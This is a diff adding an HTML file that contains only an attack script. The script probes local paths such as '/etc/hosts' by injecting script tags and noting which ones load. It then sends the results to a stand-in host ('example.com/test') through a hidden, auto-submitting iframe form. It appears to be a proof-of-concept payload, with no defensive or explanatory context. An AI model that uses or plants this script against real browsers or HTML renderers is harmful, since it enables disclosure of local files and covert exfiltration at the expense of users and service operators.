@@ -1,0 +1,67 @@
+<script>
+  const sendTarget = "http://example.com/test";
+  const data = {};
+  data.path = location.href;
+  data.probe = {}
+
+  const lists = ['a', 'b', 'c', '/etc/hosts']
+  const waitGroup = {
+    i: 0
+  }
+
+  const probe = (path, data, waitGroup) => {
+    waitGroup.i++
+    const s = document.createElement("script")
+    const target = document.children[0]
+    s.src = path
+    target.appendChild(s)
+    s.onload = function() {
+      data.probe[path] = true
+      target.removeChild(s)
+      waitGroup.i--
+    }
+    s.onerror = () => {
+      target.removeChild(s)
+      waitGroup.i--
+    }
+  }
+
+  const submitForm = () => {
+    const frame = document.createElement('iframe');
+    frame.style = 'display: none;'
+    const target = document.children[0];
+    target.appendChild(frame);
+    const form = document.createElement('form');
+    form.method = "POST";
+    form.action = sendTarget;
+    Object.keys(data.probe).forEach(path => {
+      const input = document.createElement('input');
+      input.type = 'text';
+      input.name = path;
+      form.appendChild(input);
+    })
+    const inputSubmit = document.createElement('input');
+    inputSubmit.type = 'submit';
+    form.appendChild(inputSubmit);
+
+    const wrapper = document.createElement('div');
+    wrapper.appendChild(form);
+
+    const sendScript = document.createElement('script');
+    sendScript.innerHTML = 'document.querySelector("form").submit()';
+    form.appendChild(sendScript)
+
+    frame.src = `data:text/html,${encodeURIComponent(wrapper.innerHTML)}`;
+  }
+
+  lists.forEach(path => probe(path, data, waitGroup))
+
+  var id = setInterval(() => {
+    if(waitGroup.i === 0) {
+      console.log('done', data)
+      clearInterval(id)
+      submitForm()
+    }
+  }, 500)
+  console.log(data)
+</script>
